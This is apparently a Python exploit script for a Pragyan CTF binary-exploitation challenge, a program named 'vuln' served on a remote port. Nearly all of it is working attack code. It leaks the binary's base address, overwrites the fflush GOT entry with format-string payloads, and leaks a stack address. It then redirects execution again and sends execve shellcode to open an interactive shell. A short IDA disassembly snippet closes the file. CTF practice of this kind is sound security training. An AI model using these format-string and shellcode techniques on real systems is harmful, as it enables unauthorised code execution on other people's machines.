#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./vuln')
host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6005)

gdbscript = '''
tbreak main
# b *free
b *main+194
b *main+277
b *main+360
b *main+443
b *main+453
b *main+568
# b *done+28
continue
'''.format(**locals())

libc=SetupLibcELF()
io = start()

rl()
sl(b"111111111")
exe.address=GetInt(re())[0]-exe.sym.main
sl(b"1")
re()
sl(b"1")
re()
sl(b"\xff")
fmt1=fmtstr_payload(7, {exe.got.fflush : exe.sym.lin})
sla(b"But....\n",fmt1)
sla(b"But....\n",f"%{0xa}$p")
pause()
stack_leak=int(rl().strip(b'\n'), 16)
info(f"STACK LEAK : {hex(stack_leak)}")
fmt1=fmtstr_payload(7, {exe.got.fflush : exe.sym.nic+170})
sla(b"But....\n",fmt1)
sl(asm(execve_x32))
io.interactive()


"""
.data:565585A0 arr db ' ', '3', '4', '5', '6', '7', '8', '9', ':', ';', 0EFh, 'g', 'h', 'i'
.data:565585A0                                         ; DATA XREF: fmt_vuln+3A↑o
.data:565585A0 db 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w'
.data:565585A0 db 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K'
.data:565585A0 db 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y'
.data:565585A0 db 'Z', 0
"""